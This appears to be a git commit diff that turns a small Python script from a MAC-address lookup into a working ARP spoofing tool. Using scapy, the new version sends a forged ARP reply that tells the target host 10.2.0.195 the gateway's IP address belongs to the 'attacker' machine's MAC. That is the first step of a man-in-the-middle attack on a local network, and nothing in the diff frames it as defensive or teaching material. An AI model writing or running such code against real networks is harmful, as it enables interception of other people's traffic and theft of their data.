fed605059dfb78ac03111076abda05ee7ca9da06
Ctrl-ux <3126087032@qq.com>
2024-11-26 11:42:55 +0800

    Update ARP.py

--- ARP.py
+++ ARP.py
@@ -1,13 +1,16 @@
-from scapy.all import getmacbyip
+from scapy.all import *
 
-# 替换为目标设备和网关的 IP 地址
 target_ip = "10.2.0.195"
 gateway_ip = "10.2.0.1"
+iface = "eth0"
 
-# 获取 MAC 地址
 target_mac = getmacbyip(target_ip)
 gateway_mac = getmacbyip(gateway_ip)
+attacker_mac = get_if_hwaddr(iface)
 
-# 输出结果
-print(f"{target_mac}")
-print(f"{gateway_mac}")
+if target_mac and gateway_mac:
+    print(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}, Attacker MAC: {attacker_mac}")
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
+    send(packet, iface=iface, verbose=True)
+else:
+    print("Failed to get MAC addresses.")
